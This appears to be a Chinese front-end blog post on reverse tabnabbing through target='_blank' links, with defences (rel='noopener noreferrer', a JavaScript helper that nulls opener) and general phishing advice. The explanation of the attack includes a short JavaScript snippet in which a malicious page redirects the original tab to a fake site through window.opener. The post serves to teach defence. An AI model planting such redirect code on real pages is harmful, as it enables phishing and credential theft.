---
title: 钓鱼与target=_blank
date: 2022-10-26 15:06:05
urlname: target-blank-should-be-used-with-caution
category: 前端
---

钓鱼网站攻击，指攻击者创建一个伪装的网站，看起来像合法的网站，但实际上包含恶意行为。攻击者可能会诱使用户输入敏感信息，或者通过诱导用户下载恶意软件来感染系统

在网页中使用链接时，如果想要让浏览器自动在新的标签页打开指定的地址，通常的做法就是在 `<a>` 标签上添加 `target="_blank"` 属性

然而，就是这个属性为钓鱼攻击者带来了可乘之机

![pkl6fje.jpg](https://s21.ax1x.com/2024/05/26/pkl6fje.jpg)

<!-- more -->

## 起源

### parent 与 opener

在说 `opener` 之前，可以先聊聊 `<iframe>` 中的 `parent`

我们知道，在 `<iframe>` 中提供了一个用于父子页面交互的对象，叫做 `window.parent`，我们可以通过 `window.parent` 对象来从框架中的页面访问父级页面的 `window`

`opener` 与 `parent` 一样，只不过是用于 `<a target="_blank">` 在新标签页打开的页面的。通过 `<a target="_blank">` 打开的页面，可以直接使用 `window.opener` 来访问来源页面的 `window` 对象

### 同域与跨域

浏览器提供了完整的跨域保护，在域名相同时，`parent` 对象和 `opener` 对象实际上就直接是上一级的 `window` 对象；而当域名不同时，`parent` 和 `opener` 则是经过包装的一个 `global` 对象

这个 `global` 对象仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 `DOMException`）

在 `<iframe>` 中，提供了一个 `sandbox` 属性用于控制框架中的页面的权限，因此即使是同域，也可以控制 `<iframe>` 的安全性。

## 利用

如果，你的网站上有一个链接，使用了 `target="_blank"`，那么一旦用户点击这个链接并进入一个新的标签，新标签中的页面如果存在恶意代码，就可以将你的网站直接导航到一个虚假网站。此时，如果用户回到你的标签页，看到的就是被替换过的页面了。

### 详细步骤

在你的网站 <https://example.com> 上存在一个链接：

```html
<a href="https://an.evil.site" target="_blank">进入一个“邪恶”的网站</a>
```

用户点击了这个链接，在新的标签页打开了这个网站。这个网站可以通过 `HTTP Header` 中的 `Referer` 属性来判断用户的来源。

并且，这个网站上包含着类似于这样的 `JavaScript` 代码：

```js
const url = encodeURIComponent('{{header.referer}}');
window.opener.location.replace('https://a.fake.site/?' + url);
```

此时，用户在继续浏览这个新的标签页，而原来的网站所在的标签页此时已经被导航到了 `https://a.fake.site/?https%3A%2F%2Fexample.com%2F`

恶意网站 `https://a.fake.site` 根据 Query String 来伪造一个足以欺骗用户的页面，并展示出来（期间还可以做一次跳转，使得浏览器的地址栏更具有迷惑性）

用户关闭 `https://an.evil.site` 的标签页，回到原来的网站……已经回不去了

> 上面的攻击步骤是在跨域的情况下的，在跨域情况下，`opener` 对象和 `parent` 一样，是受到限制的，仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 `DOMException`）

但是与 `parent` 不同的是，**在跨域的情况下，`opener` 仍然可以调用 `location.replace` 方法而 `parent` 则不可以**

如果是在同域的情况下（比如一个网站上的某一个页面被植入了恶意代码），则情况要比上面严重得多

## 防御

`<iframe>` 中有 `sandbox` 属性，而链接，则可以使用下面的办法：

### Referrer Policy 和 noreferrer

上面的攻击步骤中，用到了 HTTP Header 中的 `Referer` 属性，实际上可以在 HTTP 的响应头中增加 `Referrer Policy` 头来保证来源隐私安全

`Referrer Policy` 需要修改后端代码来实现，而在前端，也可以使用 `<a>` 标签的 `rel` 属性来指定 `rel="noreferrer"` 来保证来源隐私安全

```html
<a href="https://an.evil.site" target="_blank" rel="noreferrer">进入一个“邪恶”的网站</a>
```

> 但是要注意的是：即使限制了 `referer` 的传递，仍然不能阻止原标签被恶意跳转

### noopener

为了安全，现代浏览器都支持在 `<a>` 标签的 `rel` 属性中指定 `rel="noopener"`，这样，在打开的新标签页中，将无法再使用 `opener` 对象了，它为设置为了 `null`。

```html
<a href="https://an.evil.site" target="_blank" rel="noopener">进入一个“邪恶”的网站</a>
```

### JavaScript

`noopener` 属性看似是解决了所有问题，但是浏览器的兼容性问题不太行

![pkl6thV.png](https://s21.ax1x.com/2024/05/26/pkl6thV.png)

可以看到，现在绝大多数浏览器都已经兼容了 `rel="noopener"` 属性了。但是，为了保护稍旧的“近代”浏览器或是很旧的“古代”浏览器甚至是“远古”浏览器，只有 `noopener` 属性还是远远不够的

这时，就只能请出下面这段原生 JavaScript 来帮忙了

```js
"use strict";
function openUrl(url) {
    var newTab = window.open();
    newTab.opener = null;
    newTab.location = url;
}
```

## 推荐

首先，在网站中的链接上，如果使用了 `target="_blank"`，就要带上 `rel="noopener"`，并且建议带上 `rel="noreferrer"`。类似于这样：

```html
<a href="https://an.evil.site" target="_blank" rel="noopener noreferrer">进入一个“邪恶”的网站</a>
```

当然，在跳转到第三方网站的时候，为了 SEO 权重，还建议带上 `rel="nofollow"`，所以最终类似于这样：

```html
<a href="https://an.evil.site" target="_blank" rel="noopener noreferrer nofollow">进入一个“邪恶”的网站</a>

```

## 性能

最后，再来说说性能问题

如果网站使用了 `<a target="_blank">`，那么新打开的标签页的性能将会影响到当前页面。此时如果新打开的页面中执行了一个非常庞大的 JavaScript 脚本，那么原始标签页也会受到影响，会出现卡顿的现象（当然不至于卡死）

而如果在链接中加入了 `noopener`，则此时两个标签页将会互不干扰，使得原页面的性能不会受到新页面的影响

## 后记

为了防止钓鱼攻击，用户应该采取以下措施：

- 不要轻易点击来自未知来源的链接或下载未知来源的文件

- 不要提供个人信息。如果你收到一封电子邮件或短信要求你提供个人信息，请不要立即提供。相反，你应该向相应的实体确认该请求的真实性

- 使用安全软件。安全软件可以帮助你识别和阻止钓鱼攻击。你应该使用一款受信任的安全软件，并定期更新它，以确保它能够识别最新的钓鱼攻击

- 保持警惕。如果你收到一封看起来不太对劲的电子邮件或短信，请不要轻易相信它。相反，你应该仔细检查它，并向相应的实体确认它的真实性

此外，了解并识别钓鱼攻击的常见特征也是非常重要的，例如邮件内容中的拼写错误、域名不正确的邮箱地址、附加链接很短等都是可疑的信号。
